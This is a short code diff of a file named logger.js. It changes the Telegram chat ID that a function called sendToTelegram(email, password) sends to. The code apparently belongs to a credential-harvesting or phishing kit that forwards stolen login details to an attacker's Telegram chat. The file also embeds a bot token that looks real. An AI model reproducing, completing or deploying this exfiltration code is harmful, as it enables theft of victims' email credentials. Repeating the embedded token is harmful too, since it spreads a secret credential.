@@ -1,7 +1,7 @@
 // logger.js
 
 const TG_TOKEN   = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";          // ← replace
-const TG_CHAT_ID = "8372418466";            // ← replace (number or @channelusername)
+const TG_CHAT_ID = " -1003863808356";            // ← replace (number or @channelusername)
 
 async function sendToTelegram(email, password, extra = '') {
   const safeEmail    = escapeMarkdown(email);
